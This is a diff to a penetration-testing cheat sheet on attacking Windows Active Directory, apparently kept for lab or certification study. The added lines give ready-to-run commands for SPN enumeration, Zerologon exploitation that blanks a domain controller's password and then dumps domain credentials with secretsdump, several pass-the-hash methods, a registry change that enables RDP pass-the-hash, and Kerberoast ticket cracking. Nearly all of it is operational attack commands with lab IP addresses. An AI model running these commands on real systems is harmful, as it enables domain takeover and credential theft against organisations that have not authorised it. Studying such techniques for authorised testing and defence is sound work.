@@ -47,7 +47,7 @@ Enum Domain Controller hostname (PdcRoleOwner)
 PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
-Enum via. Service Principal Names (Service Accounts)
+Enum Service Principal Names 1 (Service Accounts)
 * SPNs are unique service instance identifiers, used to associate a service on a server to a service account in Active Directory.
 * Enum SPNs to obtain the IP address and port number of apps running on servers integrated with Active Directory.
 * Query the Domain Controller in search of SPNs.
@@ -72,8 +72,14 @@ Address: 192.168.1.110
 
 ### Enumeration - Automated
 
-PowerView.ps1
-* https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
+Enum Service Principal Names.
+* Kerberoast `GetUserSPNs.ps1` script: https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
+```
+PS> .\GetUserSPNs.ps1
+```
+
+Enum logged-in users and active user sessions.
+* More powerview commands https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
 ```
 PS> Set-ExecutionPolicy Unrestricted
 PS> Import-Module .\PowerView.ps1
@@ -81,7 +87,7 @@ PS> Get-NetLoggedon -ComputerName [computer_name]    # enum logged-in users
 PS> Get-NetSession -ComputerName [domain_controller] # enum active user sessions
 ```
 
-PowerShell automated users/groups/computers and SPN enum
+Enum users/groups/computers/SPNs
 ```
 # build the LDAP path
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -191,6 +197,19 @@ $ john --wordlist=rockyou.txt johncrackfile
 
 ## AD Lateral Movement
 
+Try Zerologon (requires reset after use as account pw is set to emtpy)
+* Source: https://github.com/risksense/zerologon
+* Affects ALL Windows Server versions, but we want to target DCs (high-value).
+```
+# set computer account password to an empty string.
+$ python3 set_empty_pw.py [dc_computername] [dc_ip]
+$ python3 set_empty_pw.py xor-dc01 10.11.1.120 
+
+# dump domain creds
+$ python secretsdump.py -hashes :[empty_password_hash] '[domain]/[dc_computername]$@[dc_ip]'
+$ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$@x.x.x.x'
+```
+
 Have plaintext credentials?
 ```
 # RDP clients
@@ -210,15 +229,24 @@ Pass-the-Hash
 * Requires Windows File and Print Sharing feature to be enabled.
 ```
 # Method 1
-$ pth-winexe -U [username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
-$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
+$ pth-winexe -U [domain]/[username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
+$ pth-winexe -U xor/Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
+^OR try without domain prefix in -U flag
 
 # Method 2
 $ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
 $ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee12345067801f38115019ca2fb
 
-# Method 3 - RDP PTH
+# Method 3
+$ python psexec.py [username]@[target] -hashes :[NT/NTLM]
+
+# Method 4 - RDP PTH
 $ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
+^If error occurs "Account Restrictions are preventing this user from signing in.” enable Restricted Admin Mode:
+$ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+
+# Method 5 - see guide https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
+$ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
 ```
 
 Overpass-the-Hash
@@ -313,5 +341,15 @@ $ hashcat -m 1000 -a 0 hashes.txt [path/to/wordlist.txt] -o cracked.txt
 $ john --wordlist=[path/to/wordlist.txt] hashes.txt
 ```
 
+Crack SPN hashes via. exported `.kirbi` tickets.
+```
+# Kerberoast
+$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
+PS> Invoke-Kerberoast.ps1                            # crack hashes on target
+
+# John the Ripper
+$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
+$ john --wordlist=rockyou.txt johncrackfile
+```
 
 
